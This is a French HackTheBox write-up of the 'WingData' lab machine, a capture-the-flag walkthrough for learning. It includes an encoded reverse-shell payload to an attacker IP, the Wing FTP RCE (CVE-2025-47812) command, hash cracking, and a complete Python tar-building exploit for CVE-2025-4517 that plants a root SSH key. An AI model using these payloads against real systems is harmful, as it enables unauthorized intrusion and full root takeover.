---
title: "HackTheBox - WingData"
date: 2026-02-15 14:00:00 +0200
categories: [HackTheBox, Challenge, Easy]
tags: [wing-ftp, cve-2025-47812, lua-injection, null-byte, tarfile, cve-2025-4517, path-traversal, privilege-escalation]
description: "Write-up de la machine WingData - Exploitation d'un Wing FTP Server via Lua injection (CVE-2025-47812), cracking de hash SHA256 salé, et escalade de privilèges via un bypass du filtre tarfile Python (CVE-2025-4517)"
image:
  path: /assets/img/posts/wingdata/wingdata.png
  alt: "HackTheBox - WingData"
---

## Informations sur la machine

| Propriété      | Valeur      |
| -------------- | ----------- |
| **OS**         | Linux       |
| **Difficulté** | Easy        |
| **Points**     | 20          |
| **IP**         | 10.129.10.4 |

---

## Reconnaissance

### Scan TCP

```bash
sudo nmap -sC -sV 10.129.10.4
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Deux services exposés : SSH et un serveur web Apache.

### Énumération des virtual hosts

```bash
ffuf -u http://wingdata.htb -H "Host: FUZZ.wingdata.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301,302
```

```
ftp     [Status: 200, Size: 678, Words: 44, Lines: 10]
```

Un sous-domaine **`ftp.wingdata.htb`** est découvert.

### Identification du service FTP web

```bash
curl -sv http://ftp.wingdata.htb/ 2>&1 | grep -i server
```

```
< Server: Wing FTP Server(Free Edition)
```

> Le sous-domaine héberge un **Wing FTP Server (Free Edition)** exposé via un reverse proxy Apache sur le port 8080 en interne.
{: .prompt-info }

### Énumération du FTP web

```bash
feroxbuster -u http://ftp.wingdata.htb \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

Résultats notables :

```
200  GET  263l  696w  7987c  http://ftp.wingdata.htb/login.html
200  GET   10l   52w   678c  http://ftp.wingdata.htb/main.html
200  GET    2l   31w   342c  http://ftp.wingdata.htb/search.html
200  GET    1l    2w    16c  http://ftp.wingdata.htb/dir.html
200  GET    7l   51w   665c  http://ftp.wingdata.htb/editor.html
200  GET    1l    2w    15c  http://ftp.wingdata.htb/zip.html
200  GET    8l   19w   259c  http://ftp.wingdata.htb/logout.html
```

L'interface web permet une connexion en tant qu'**anonymous** sans mot de passe, mais avec des permissions très limitées (lecture seule, aucun fichier accessible).

---

## Exploitation initiale — CVE-2025-47812

### Identification de la vulnérabilité

```bash
searchsploit "wing ftp"
```

```
Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)  | multiple/remote/52347.py
```

La CVE-2025-47812 permet une **exécution de code à distance non authentifiée** sur Wing FTP Server ≤ 7.4.3. La vulnérabilité exploite un traitement incorrect des octets NULL (`%00`) dans le paramètre `username` lors de la connexion. Le serveur tronque le nom d'utilisateur au NULL byte pour la vérification (`c_CheckUser()`), mais utilise la chaîne complète non assainie lors de la création du fichier de session, permettant l'injection de **code Lua** qui sera exécuté lors de l'accès à une fonctionnalité authentifiée comme `dir.html`.

### Exploitation

```bash
python3 52347.py -u http://ftp.wingdata.htb -c "id" -U anonymous
```

```
[+] UID extracted: 145f8d7cd88d20ddc92a431fb65c0880...
--- Command Output ---
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),
29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

> L'exécution de code fonctionne en tant que l'utilisateur **wingftp** (uid=1000).
{: .prompt-tip }

### Obtention d'un reverse shell

```bash
# Listener
nc -lvnp 4444

# Payload encodé en base64 pour éviter les problèmes de quotes
python3 52347.py -u http://ftp.wingdata.htb \
  -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNTIvNDQ0NCAwPiYx | base64 -d | bash" \
  -U anonymous
```

```
wingftp@wingdata:/opt/wftpserver$ id
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),...
```

---

## Mouvement latéral — wingftp → wacky

### Extraction des hashes utilisateur

Wing FTP stocke les comptes utilisateur dans des fichiers XML sous `/opt/wftpserver/Data/1/users/`. Avec le shell wingftp, on accède à ces fichiers :

```bash
find /opt/wftpserver -name "*.xml" 2>/dev/null
```

Fichiers utilisateur découverts : `anonymous.xml`, `john.xml`, `maria.xml`, `steve.xml`, **`wacky.xml`**.

Le fichier de configuration du domaine révèle que les mots de passe sont hashés en **SHA-256 avec salting** :

```xml
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

Hashes extraits :

| Utilisateur | Hash SHA-256                                                       |
| ----------- | ------------------------------------------------------------------ |
| wacky       | `32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca` |
| john        | `c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10` |
| maria       | `a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03` |
| steve       | `5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca` |

L'utilisateur cible est **wacky** (uid=1001), le seul avec un répertoire `/home/wacky` sur le système.

### Cracking du hash

Le format est `sha256($pass.$salt)` avec le salt `WingFTP` — mode hashcat **1410** :

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hashes.txt
hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

> Le mot de passe de **wacky** est **`!#7Blushing^*Bride5`**.
{: .prompt-tip }

### Connexion SSH

```bash
ssh wacky@wingdata.htb
# Password: !#7Blushing^*Bride5
```

```bash
wacky@wingdata:~$ cat user.txt
```

---

## Escalade de privilèges — CVE-2025-4517

### Énumération

```bash
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

L'utilisateur wacky peut exécuter un script Python de restauration de backups **en tant que root** sans mot de passe.

### Analyse du script

```bash
cat /opt/backup_clients/restore_backup_clients.py
```

Le script effectue les opérations suivantes :
1. Valide le nom du fichier backup (format `backup_<id>.tar`)
2. Valide le nom du répertoire de restauration (format `restore_<tag>`)
3. Crée le répertoire de staging sous `/opt/backup_clients/restored_backups/`
4. **Extrait l'archive tar** dans ce répertoire avec `tarfile.extractall(path=staging_dir, filter="data")`

Le point crucial est l'utilisation de `filter="data"`, introduit dans **Python 3.12**, censé protéger contre les path traversal, symlinks malveillants et hardlinks absolus.

```bash
/usr/local/bin/python3 --version
```

```
Python 3.12.3
```

Le dossier `backups` est **writable** par wacky (`drwxrwx---`), permettant d'y déposer des archives tar malicieuses.

### Identification de la vulnérabilité

La version Python 3.12.3 est vulnérable à **CVE-2025-4517**, une faille critique (CVSS 10.0) dans le module `tarfile`. Le filtre `data` utilise `os.path.realpath()` pour valider les chemins, mais cette fonction ne résout plus les symlinks lorsque le chemin résolu **dépasse `PATH_MAX`** (4096 octets sur Linux). En créant une chaîne de symlinks imbriqués dont la résolution dépasse cette limite, on contourne entièrement le filtre et on peut écrire des fichiers arbitrairement en dehors du répertoire de destination.

### Exploitation

Le PoC crée une structure de répertoires et de symlinks dont la résolution de chemin dépasse PATH_MAX, puis utilise cette chaîne pour échapper au répertoire d'extraction et écrire une clé SSH dans `/root/.ssh/authorized_keys`.

**Génération de la clé SSH :**

```bash
ssh-keygen -t ed25519 -f /tmp/mykey -N '' -q
```

**Création de l'archive tar malicieuse :**

```bash
cat > /tmp/make_tar.py << 'PYEOF'
import tarfile
import os
import io

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    # Créer une chaîne de symlinks imbriqués dépassant PATH_MAX
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    # Symlink final qui dépasse PATH_MAX — os.path.realpath() ne le résout plus
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)

    # Symlink d'échappement vers /root/.ssh
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../root/.ssh"
    tar.addfile(e)

    # Écriture de la clé publique via le symlink
    pubkey = open("/tmp/mykey.pub", "rb").read()
    n = tarfile.TarInfo("escape/authorized_keys")
    n.type = tarfile.REGTYPE
    n.size = len(pubkey)
    n.mode = 0o600
    tar.addfile(n, fileobj=io.BytesIO(pubkey))

print("Tar created!")
PYEOF

python3 /tmp/make_tar.py
```

**Exécution du script en tant que root :**

```bash
cp /tmp/backup_9999.tar /opt/backup_clients/backups/
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar -r restore_pwned
```

```
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwned
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwned
```

**Connexion en tant que root :**

```bash
ssh -i /tmp/mykey root@localhost
```

```bash
root@wingdata:~# id
uid=0(root) gid=0(root) groups=0(root)
root@wingdata:~# cat /root/root.txt
```

---

## Leçons apprises

- **L'énumération des virtual hosts** est essentielle — le sous-domaine `ftp.wingdata.htb` hébergeait le service vulnérable, invisible sur le domaine principal
- **Wing FTP Server ≤ 7.4.3** est vulnérable à une RCE non authentifiée via injection Lua dans les fichiers de session (CVE-2025-47812), exploitant un traitement incorrect des octets NULL
- **Les mots de passe des applications** sont souvent réutilisés pour les comptes système — le hash SHA-256 salé de Wing FTP, une fois cracké, donnait accès au compte SSH de wacky
- **Les filtres de sécurité du module tarfile** en Python 3.12 (filter="data") peuvent être contournés via CVE-2025-4517 en exploitant les limites de `PATH_MAX` lors de la résolution de symlinks par `os.path.realpath()`
- **Un script exécuté en tant que root** qui traite des archives tar contrôlées par un utilisateur représente un risque critique de privilege escalation, même avec des filtres d'extraction

**Machine complété**

{% include comments.html %}